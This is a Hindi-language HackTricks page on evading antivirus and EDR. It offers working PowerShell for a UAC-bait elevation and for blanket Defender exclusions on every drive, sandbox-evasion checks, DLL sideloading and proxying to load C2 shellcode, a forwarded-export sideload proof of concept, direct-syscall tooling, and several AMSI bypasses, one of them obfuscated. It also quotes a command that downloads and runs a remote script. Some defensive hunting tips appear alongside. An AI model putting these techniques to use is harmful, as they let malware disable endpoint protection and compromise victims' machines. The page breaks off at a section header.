# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पेज मूल रूप से** [**@m2rc_p**](https://twitter.com/m2rc_p)** ने लिखा था!**

## Defender को रोकना

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने वाला एक टूल।
- [no-defender](https://github.com/es3n1n/no-defender): किसी दूसरे AV का रूप धारण करके Windows Defender को काम करने से रोकने वाला एक टूल।
- [यदि आप admin हैं, तो Defender को Disable करें](basic-powershell-for-pentesters/README.md)

### Defender के साथ छेड़छाड़ करने से पहले installer-शैली का UAC bait

Game cheats का रूप धारण करने वाले सार्वजनिक loaders अक्सर unsigned Node.js/Nexe installers के रूप में आते हैं, जो पहले **user से elevation की अनुमति माँगते हैं** और उसके बाद ही Defender को निष्क्रिय करते हैं। इसकी प्रक्रिया सरल है:

1. `net session` से administrative context की जाँच करें। यह command तभी सफल होता है, जब चलाने वाले के पास admin rights हों; इसलिए विफलता का अर्थ है कि loader एक standard user के रूप में चल रहा है।
2. मूल command line को बनाए रखते हुए, अपेक्षित UAC consent prompt दिखाने के लिए तुरंत `RunAs` verb के साथ इसे फिर से launch करें।

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

पीड़ित पहले से ही मानते हैं कि वे “cracked” सॉफ़्टवेयर इंस्टॉल कर रहे हैं, इसलिए वे आम तौर पर प्रॉम्प्ट स्वीकार कर लेते हैं। इससे malware को Defender की policy बदलने के लिए ज़रूरी अधिकार मिल जाते हैं।<sup>[[26]](#references)</sup>

### हर drive letter के लिए व्यापक `MpPreference` exclusions

अधिकार मिलने के बाद, GachiLoader-शैली की chains सेवा को पूरी तरह बंद करने के बजाय Defender के blind spots को अधिकतम करती हैं। Loader पहले GUI watchdog को बंद करता है (`taskkill /F /IM SecHealthUI.exe`), फिर **बेहद व्यापक exclusions** जोड़ता है, ताकि हर user profile, system directory और removable disk को scan न किया जा सके:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

मुख्य observations:

- यह loop हर mounted filesystem (D:\, E:\, USB sticks आदि) पर चलता है, इसलिए **बाद में disk पर कहीं भी रखा गया कोई भी payload अनदेखा हो जाता है**।
- `.sys` extension का exclusion भविष्य को ध्यान में रखकर है—हमलावर बाद में Defender को दोबारा छुए बिना unsigned drivers load करने का विकल्प सुरक्षित रखते हैं।
- सभी बदलाव `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` के अंतर्गत होते हैं, जिससे बाद के stages यह पुष्टि कर सकते हैं कि exclusions बने हुए हैं या उन्हें फिर से UAC trigger किए बिना बढ़ा सकते हैं।

चूँकि कोई Defender service बंद नहीं की जाती, साधारण health checks अब भी “antivirus active” बताते रहते हैं, हालाँकि real-time inspection उन paths को कभी जाँचता ही नहीं।<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

वर्तमान में, AVs यह जाँचने के लिए अलग-अलग तरीके इस्तेमाल करते हैं कि कोई file malicious है या नहीं: static detection, dynamic analysis और अधिक उन्नत EDRs के लिए behavioural analysis।

### **Static detection**

Static detection में binary या script के भीतर ज्ञात malicious strings या bytes के arrays को flag किया जाता है, साथ ही file से ही जानकारी निकाली जाती है (जैसे file description, company name, digital signatures, icon, checksum आदि)। इसका मतलब है कि सार्वजनिक रूप से उपलब्ध ज्ञात tools इस्तेमाल करने पर आपके पकड़े जाने की संभावना बढ़ सकती है, क्योंकि उनका शायद पहले ही विश्लेषण किया जा चुका है और उन्हें malicious के रूप में flag किया गया है। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

यदि आप binary को encrypt करते हैं, तो AV के पास आपके program का पता लगाने का कोई तरीका नहीं होगा, लेकिन आपको program को memory में decrypt करके चलाने के लिए किसी loader की आवश्यकता होगी।

- **Obfuscation**

कभी-कभी AV से बचाने के लिए binary या script में कुछ strings बदलना ही पर्याप्त होता है, लेकिन आप जिस चीज़ को obfuscate करना चाहते हैं, उसके आधार पर इसमें काफी समय लग सकता है।

- **Custom tooling**

यदि आप अपने tools खुद develop करते हैं, तो उनसे जुड़ी कोई ज्ञात bad signature नहीं होगी, लेकिन इसमें बहुत समय और मेहनत लगती है।

> [!TIP]
> Windows Defender की static detection के विरुद्ध जाँच करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह file को कई segments में बाँटता है और फिर Defender से हर segment को अलग-अलग scan करवाता है। इस तरह यह आपको ठीक-ठीक बता सकता है कि आपकी binary में कौन-सी strings या bytes flag की गई हैं।

मैं इस [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) को देखने की पुरज़ोर सलाह देता हूँ, जो practical AV Evasion के बारे में है।

### Offline PE-feature tests for static classifiers

Packed या encrypted payload bytes, static classifier के लिए केवल एक input हैं। EMBER2024, imports, exports, sections, headers और Authenticode data सहित PE features निकालता है।<sup>[[48]](#references)</sup> एक loader experiment में, 141 benign दिखने वाले imports जोड़ने से EMBER2024 का malicious score 93% कम हुआ, जबकि malware से जुड़े imports ने इसे बढ़ाया। यह उस model और उन samples का परिणाम है, किसी खास AV/EDR product को भरोसेमंद तरीके से bypass करने का तरीका नहीं।<sup>[[50]](#references)</sup>

किसी authorized loader test के लिए, payload और execution path को स्थिर रखें, हर variant में केवल एक इच्छित build variable बदलें, और scores की offline तुलना करें। PE features के परिणामों की जाँच करें, क्योंकि build में बदलाव एक से अधिक feature groups को प्रभावित कर सकता है।<sup>[[49]](#references)[[50]](#references)</sup> इच्छित imports को IAT में बनाए रखने के लिए, चुने हुए Win32 APIs को reachable code से call करें। Selection में बदलाव करें और call sites को अलग-अलग builds में बाँटें, न कि एक fixed camouflage function बनाएँ जो signature बन सकता है। Experiment में valid code signing, export entries और `.pdata` को बड़ा करने वाले अधिक functions के साथ scores कम हुए; invalid signing का प्रभाव बहुत कम था और `.pdata` का प्रभाव छोटा था।<sup>[[50]](#references)</sup>

`thrember` package feature extraction और benchmark models उपलब्ध कराता है। इसे install करने के बाद, किसी मौजूदा `models` directory के साथ `thrember.download_models("models")` चलाएँ, फिर scorer को उसकी parent directory से चलाएँ: download helper current working directory बदल देता है। PE classifier, builds को किसी scanning service पर submit किए बिना, उनकी directory का score निकाल सकता है:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

मॉडल और feature-extractor के versions को तुलना के दौरान स्थिर रखें। कम offline score से सिर्फ़ यह पता चलता है कि यह classifier बदले हुए binary पर कैसी प्रतिक्रिया देता है; इससे behavioral analysis, emulation या किसी vendor के अलग model से बच निकलना साबित नहीं होता।<sup>[[49]](#references)[[50]](#references)</sup> [virtualized payloads में per-build polymorphism और outer-binary camouflage](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) के लिए, अलग execution model देखें।

### **Dynamic analysis**

Dynamic analysis तब होती है जब AV आपके binary को sandbox में चलाता है और दुर्भावनापूर्ण गतिविधियों पर नज़र रखता है (जैसे आपके browser के passwords को decrypt करके पढ़ने की कोशिश करना, LSASS का minidump लेना आदि)। इसके साथ काम करना थोड़ा मुश्किल हो सकता है, लेकिन sandbox से बचने के लिए आप ये कुछ चीज़ें कर सकते हैं।

- **चलाने से पहले Sleep करें** इसे लागू करने के तरीके के आधार पर, यह AV की dynamic analysis को bypass करने का अच्छा तरीका हो सकता है। AV को files scan करने के लिए बहुत कम समय मिलता है, ताकि user के काम में रुकावट न आए। इसलिए, लंबे समय तक sleep करने से binaries का analysis बाधित हो सकता है। समस्या यह है कि कई AV sandbox, इसे लागू करने के तरीके के आधार पर, sleep को छोड़ सकते हैं।
- **मशीन के resources जाँचें** आमतौर पर Sandbox के पास काम करने के लिए बहुत कम resources होते हैं (जैसे < 2GB RAM), वरना वे user की मशीन को धीमा कर सकते हैं। यहाँ आप काफ़ी रचनात्मक भी हो सकते हैं, उदाहरण के लिए CPU का temperature या fan की speed जाँचकर—sandbox में हर चीज़ लागू नहीं होती।
- **मशीन-विशिष्ट जाँचें** अगर आप ऐसे user को target करना चाहते हैं जिसका workstation "contoso.local" domain से जुड़ा है, तो आप computer का domain जाँच सकते हैं कि वह आपके बताए domain से मेल खाता है या नहीं। अगर मेल नहीं खाता, तो आप अपने program को exit करवा सकते हैं।

पता चला है कि Microsoft Defender के Sandbox computer का नाम HAL9TH है। इसलिए, detonation से पहले आप अपने malware में computer का नाम जाँच सकते हैं। अगर नाम HAL9TH से मेल खाता है, तो इसका मतलब है कि आप Defender के sandbox के अंदर हैं; ऐसे में आप अपने program को exit करवा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>स्रोत: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के विरुद्ध काम करने के लिए [@mgeeky](https://twitter.com/mariuszbit) के कुछ और बहुत अच्छे सुझाव:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस post में पहले कहा है, **public tools** को आखिरकार **detect कर लिया जाएगा**, इसलिए आपको खुद से एक सवाल पूछना चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, तो **क्या आपको सच में mimikatz इस्तेमाल करने की ज़रूरत है**? या आप कोई ऐसा दूसरा project इस्तेमाल कर सकते हैं जो कम जाना-पहचाना हो और LSASS को dump भी करता हो?

शायद दूसरा विकल्प सही है। उदाहरण के तौर पर mimikatz को लें—यह AV और EDR द्वारा सबसे ज़्यादा flag किए जाने वाले malware में से एक है, शायद सबसे ज़्यादा flag किया जाने वाला। Project खुद बहुत अच्छा है, लेकिन AV से बचने के लिए इसके साथ काम करना मुश्किल है। इसलिए, आप जो हासिल करना चाहते हैं उसके लिए alternatives तलाशें।

> [!TIP]
> Evasion के लिए अपने payloads में बदलाव करते समय, Defender में **automatic sample submission बंद करना** न भूलें। और कृपया, अगर आपका लक्ष्य लंबे समय तक evasion हासिल करना है, तो **VIRUSTOTAL पर UPLOAD न करें**। अगर आप जाँचना चाहते हैं कि कोई खास AV आपके payload को detect करता है या नहीं, तो उसे VM पर install करें, automatic sample submission बंद करने की कोशिश करें और नतीजे से संतुष्ट होने तक वहीं test करें।

## EXEs vs DLLs

जब भी संभव हो, evasion के लिए हमेशा **DLLs को प्राथमिकता दें**। मेरे अनुभव में, DLL files आमतौर पर **बहुत कम detect और analyze होती हैं**। इसलिए, कुछ मामलों में detection से बचने के लिए यह एक बहुत आसान तरकीब है (बशर्ते आपके payload को DLL के रूप में चलाने का कोई तरीका हो)।

जैसा कि हम इस image में देख सकते हैं, Havoc के DLL Payload की antiscan.me पर detection rate 4/26 है, जबकि EXE payload की detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>सामान्य Havoc EXE payload और सामान्य Havoc DLL की antiscan.me पर तुलना</p></figcaption></figure>

अब हम DLL files के साथ इस्तेमाल की जा सकने वाली कुछ तरकीबें दिखाएँगे, ताकि आप और भी stealthy रह सकें।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा इस्तेमाल किए जाने वाले DLL search order का फ़ायदा उठाता है। इसमें victim application और malicious payload(s) को एक ही जगह पर रखा जाता है।

[Siofra](https://github.com/Cybereason/siofra) और नीचे दी गई PowerShell script का इस्तेमाल करके, आप DLL Sideloading के प्रति संवेदनशील programs खोज सकते हैं:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

यह command "C:\Program Files\\" के अंदर DLL hijacking के प्रति संवेदनशील programs की सूची और उन DLL files को दिखाएगा जिन्हें वे load करने की कोशिश करते हैं।

मैं अत्यधिक अनुशंसा करता हूँ कि आप **DLL Hijackable/Sideloadable programs को खुद explore करें**। सही तरीके से किया जाए तो यह technique काफी stealthy होती है, लेकिन अगर आप publicly known DLL Sideloadable programs का इस्तेमाल करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

किसी program द्वारा load किए जाने की अपेक्षा वाले नाम से malicious DLL रखने भर से आपका payload load नहीं होगा, क्योंकि program उस DLL के अंदर कुछ खास functions की अपेक्षा करता है। इस समस्या को ठीक करने के लिए, हम **DLL Proxying/Forwarding** नाम की एक और technique का इस्तेमाल करेंगे।

**DLL Proxying** program द्वारा की जाने वाली calls को proxy (और malicious) DLL से original DLL तक forward करता है। इससे program की functionality बनी रहती है और आपका payload execute किया जा सकता है।

मैं [@flangvik](https://twitter.com/Flangvik/) के [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project का इस्तेमाल करूँगा।

ये वे steps हैं जिनका मैंने पालन किया:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

आखिरी command से हमें 2 files मिलेंगी: DLL source code template और original renamed DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

ये परिणाम हैं:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे shellcode (जिसे [SGN](https://github.com/EgeBalci/sgn) से encode किया गया है) और proxy DLL, दोनों की [antiscan.me](https://antiscan.me) में 0/26 Detection rate है! मैं इसे सफल कहूँगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading के बारे में [S3cur3Th1sSh1t का twitch VOD](https://www.twitch.tv/videos/1644171543) देखने की मैं **पुरज़ोर सलाह देता हूँ**। हमने जिन बातों पर चर्चा की है, उनके बारे में और गहराई से जानने के लिए [ippsec का वीडियो](https://www.youtube.com/watch?v=3eROsG_WNpE) भी देखें।

### Forwarded Exports का दुरुपयोग (ForwardSideLoading)

Windows PE modules ऐसे functions export कर सकते हैं जो वास्तव में "forwarders" होते हैं: code की ओर संकेत करने के बजाय, export entry में `TargetDll.TargetFunc` के रूप में ASCII string होती है। जब कोई caller export को resolve करता है, तो Windows loader:

- `TargetDll` को load करेगा, अगर वह पहले से load नहीं है
- उसमें से `TargetFunc` को resolve करेगा

समझने योग्य मुख्य व्यवहार:
- अगर `TargetDll` एक KnownDLL है, तो उसे protected KnownDLLs namespace (जैसे ntdll, kernelbase, ole32) से लिया जाता है।<sup>[[15]](#references)</sup>
- अगर `TargetDll` एक KnownDLL नहीं है, तो DLL का सामान्य search order इस्तेमाल होता है, जिसमें उस module की directory भी शामिल होती है जो forward resolution कर रहा है।

इससे एक indirect sideloading primitive संभव होता है: ऐसी signed DLL खोजें जो किसी function को ऐसे module name पर forward करती हो जो KnownDLL न हो, फिर उस signed DLL के साथ उसी नाम की attacker-controlled DLL रखें जो forwarded target module का नाम हो। जब forwarded export को invoke किया जाता है, तो loader forward को resolve करता है और उसी directory से आपकी DLL load करता है, जिससे आपका DllMain execute होता है।<sup>[[13]](#references)</sup>

Windows 11 पर देखा गया उदाहरण:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` एक KnownDLL नहीं है, इसलिए इसे सामान्य search order के ज़रिए resolve किया जाता है।

PoC (copy-paste):
1) Signed system DLL को किसी writable folder में कॉपी करें.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी folder में एक malicious `NCRYPTPROV.dll` रखें। Code execution के लिए एक न्यूनतम DllMain पर्याप्त है; DllMain को trigger करने के लिए forwarded function को implement करने की ज़रूरत नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) एक signed LOLBin से forward को trigger करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

देखा गया व्यवहार:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) लोड करता है
- `KeyIsoSetAuditingInterface` को resolve करते समय, loader forward को `NCRYPTPROV.SetAuditingInterface` तक follow करता है
- इसके बाद loader `C:\test` से `NCRYPTPROV.dll` लोड करता है और उसका `DllMain` execute करता है
- अगर `SetAuditingInterface` implement नहीं किया गया है, तो `DllMain` के चलने के बाद ही "missing API" error मिलेगा

Hunting के लिए सुझाव:
- ऐसे forwarded exports पर ध्यान दें जिनका target module KnownDLL न हो। KnownDLLs `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के अंतर्गत सूचीबद्ध हैं।
- आप इन जैसे tools से forwarded exports enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- candidates खोजने के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense के सुझाव:
- LOLBins (जैसे, rundll32.exe) द्वारा non-system paths से signed DLLs लोड करने पर निगरानी रखें, और इसके बाद उसी directory से समान base name वाले non-KnownDLLs लोड होने पर भी निगरानी रखें
- इस तरह की process/module chains पर alert करें: `rundll32.exe` → non-system `keyiso.dll` → user-writable paths के अंतर्गत `NCRYPTPROV.dll`
- code integrity policies (WDAC/AppLocker) लागू करें और application directories में write+execute को रोकें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

आप Freeze का उपयोग stealthy तरीके से अपना shellcode लोड और execute करने के लिए कर सकते हैं।

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion बस बिल्ली-और-चूहे का खेल है; आज जो काम करता है, कल पकड़ा जा सकता है। इसलिए कभी भी सिर्फ़ एक टूल पर निर्भर न रहें। संभव हो, तो कई evasion techniques को एक साथ आज़माएँ।

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR अक्सर `ntdll.dll` syscall stubs पर **user-mode inline hooks** लगाते हैं। इन hooks को bypass करने के लिए, आप **direct** या **indirect** syscall stubs बना सकते हैं, जो सही **SSN** (System Service Number) लोड करते हैं और hooked export entrypoint को execute किए बिना kernel mode में प्रवेश करते हैं।<sup>[[32]](#references)</sup>

**Invocation के विकल्प:**
- **Direct (embedded)**: generated stub में `syscall`/`sysenter`/`SVC #0` instruction emit करें (इससे `ntdll` export hit नहीं होता)।
- **Indirect**: `ntdll` के अंदर मौजूद किसी `syscall` gadget पर jump करें, ताकि kernel transition `ntdll` से शुरू होता हुआ दिखे (heuristic evasion के लिए उपयोगी); **randomized indirect** हर call के लिए pool से एक gadget चुनता है।
- **Egg-hunt**: disk पर static `0F 05` opcode sequence embed करने से बचें; runtime पर syscall sequence resolve करें।

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes पढ़ने के बजाय syscall stubs को virtual address के आधार पर sort करके SSNs का अनुमान लगाएँ।
- **SyscallsFromDisk**: एक clean `\KnownDlls\ntdll.dll` map करें, उसके `.text` से SSNs पढ़ें, फिर उसे unmap करें (यह memory में मौजूद सभी hooks को bypass करता है)।
- **RecycledGate**: VA-sorted SSN inference को opcode validation के साथ जोड़ें, जब stub clean हो; hooked होने पर VA inference का सहारा लें।
- **HW Breakpoint**: `syscall` instruction पर DR0 सेट करें और runtime पर `EAX` से SSN प्राप्त करने के लिए VEH का उपयोग करें, बिना hooked bytes को parse किए।

SysWhispers4 के उपयोग का उदाहरण:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

x64 `ntdll` syscall exports को SSN के लिए parse करते समय, दोनों sequence स्वीकार करें: `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) और वही sequence, जिसके पहले `F3 0F 1E FA` (`endbr64`) हो। बाद वाला CET-prefixed stub है: जो parser मानता है कि SSN हमेशा एक ही fixed offset पर होगा, वह इसे पहचान नहीं पाएगा। अगर indirect-syscall initialization विफल हो जाता है और loader `GetProcAddress` पर fallback करता है, तो इन exports के ज़रिए की गई calls को फिर से user-mode hooks का सामना करना पड़ सकता है।<sup>[[54]](#references)</sup>

## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" को रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल **disk पर मौजूद files** को scan कर सकते थे। इसलिए, अगर आप किसी तरह payloads को **सीधे memory में** execute कर पाते, तो AV उसे रोकने के लिए कुछ नहीं कर सकता था, क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

AMSI feature Windows के इन components में integrated है।

- User Account Control, या UAC (EXE, COM, MSI, या ActiveX installation का elevation)
- PowerShell (scripts, interactive use, और dynamic code evaluation)
- Windows Script Host (wscript.exe और cscript.exe)
- JavaScript और VBScript
- Office VBA macros

यह antivirus solutions को script contents को unencrypted और unobfuscated रूप में उपलब्ध कराकर script behavior inspect करने की सुविधा देता है।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर Windows Defender में यह alert दिखेगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` और फिर उस executable का path जोड़ता है जिससे script चली थी। इस मामले में, वह powershell.exe है।

हमने disk पर कोई file नहीं रखी, लेकिन फिर भी AMSI की वजह से memory में पकड़े गए।

इसके अलावा, **.NET 4.8** से C# code भी AMSI के ज़रिए चलाया जाता है। इसका असर in-memory execution के लिए `Assembly.Load(byte[])` के इस्तेमाल पर भी पड़ता है। इसलिए, अगर आप AMSI से बचते हुए in-memory execution करना चाहते हैं, तो .NET के पुराने versions (जैसे 4.7.2 या उससे नीचे) इस्तेमाल करने की सलाह दी जाती है।

AMSI से बचने के कुछ तरीके हैं:

- **Obfuscation**

AMSI मुख्य रूप से static detections पर काम करता है, इसलिए load करने की कोशिश की जा रही scripts में बदलाव करना detection से बचने का एक अच्छा तरीका हो सकता है।

हालांकि, AMSI कई layers वाली scripts को भी unobfuscate कर सकता है, इसलिए इसे कैसे किया गया है, उसके आधार पर obfuscation एक खराब विकल्प हो सकता है। इस वजह से इससे बचना हमेशा सीधा-सादा नहीं होता। फिर भी, कभी-कभी बस कुछ variable names बदलना ही काफी होता है, इसलिए यह इस पर निर्भर करता है कि किसी चीज़ को कितना flag किया गया है।

- **AMSI Bypass**

AMSI को powershell (और cscript.exe, wscript.exe आदि) process में एक DLL load करके implement किया जाता है, इसलिए unprivileged user के रूप में चलते हुए भी इसके साथ आसानी से छेड़छाड़ की जा सकती है। AMSI के implementation की इस खामी के कारण, researchers ने AMSI scanning से बचने के कई तरीके खोजे हैं।

**एक Error उत्पन्न करना**

AMSI initialization को विफल करने पर (`amsiInitFailed`) मौजूदा process के लिए कोई scan शुरू नहीं होगा। इसे मूल रूप से [Matt Graeber](https://twitter.com/mattifestation) ने सार्वजनिक किया था और Microsoft ने इसके व्यापक इस्तेमाल को रोकने के लिए एक signature विकसित की है।

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI को मौजूदा powershell process के लिए अनुपयोगी बनाने में powershell code की सिर्फ़ एक line लगी। बेशक, इस line को खुद AMSI ने flag कर दिया है, इसलिए इस technique का इस्तेमाल करने के लिए इसमें कुछ बदलाव करने होंगे।

यहाँ एक संशोधित AMSI bypass है, जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

ध्यान रखें कि यह पोस्ट प्रकाशित होने के बाद संभवतः फ़्लैग हो जाएगी, इसलिए अगर आपकी योजना पकड़े बिना बने रहने की है, तो कोई कोड प्रकाशित न करें।

**Memory Patching**

इस तकनीक की खोज सबसे पहले [@RastaMouse](https://twitter.com/_RastaMouse/) ने की थी। इसमें amsi.dll में "AmsiScanBuffer" फ़ंक्शन का पता ढूँढ़ना (यह उपयोगकर्ता द्वारा दिए गए इनपुट को स्कैन करने के लिए ज़िम्मेदार है) और उसे E_INVALIDARG का कोड लौटाने वाले निर्देशों से ओवरराइट करना शामिल है। इस तरह, वास्तविक स्कैन का परिणाम 0 लौटाता है, जिसे क्लीन परिणाम माना जाता है।

> [!TIP]
> अधिक विस्तृत व्याख्या के लिए कृपया [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

powershell के साथ AMSI को बायपास करने के लिए कई अन्य तकनीकें भी इस्तेमाल की जाती हैं। इनके बारे में और जानने के लिए [**इस पेज**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**इस repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) को देखें।

### `AmsiScanBuffer` patching के बजाय AMSI COM scan-pointer redirection

एक अन्य process-local bypass, `AmsiScanBuffer` entry point को बिना छुए छोड़ता है। रिपोर्ट किए गए 64-bit .NET loader में, CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` से एक AMSI COM object बनाया जाता है; `Marshal.GetIUnknownForObject()` से interface pointer मिलता है, और offset `0x18` पर मौजूद उसका vtable slot scan-call target के रूप में इस्तेमाल होता है। Loader, `Console.Clear()` के native pointer को एक छोटे x64 stub से patch करता है, `VirtualProtect()` के तहत उस vtable entry को stub पर सेट करता है, फिर page protection को मूल स्थिति में बहाल कर देता है। इसके लिए 64-bit pointer width और अपेक्षित COM layout, दोनों ज़रूरी हैं; यह मनमाने AMSI interfaces या builds के लिए कोई सामान्य offset नहीं है। इससे पहले देखे गए चरण हैं [signed AppDomainManager sidecar loading](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) और [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml)।<sup>[[51]](#references)</sup>

देखे गए stub bytes हैं `41 C7 00 01 00 00 00 33 C0 C3`: ये `r8` में मौजूद result pointer पर **1** लिखते हैं और `eax` में **0** लौटाते हैं। इसलिए, scan result के `AMSI_RESULT_CLEAN` (0) होने का बताया गया दावा, `S_OK` return value और output enum को एक मान लेता है। दस्तावेज़ित `AMSI_RESULT` क्रम में, परिणाम **1** का अर्थ `AMSI_RESULT_NOT_DETECTED` है; यह फिर भी detection threshold से नीचे है।<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### amsi.dll को लोड होने से रोककर AMSI को ब्लॉक करना (LdrLoadDll hook)

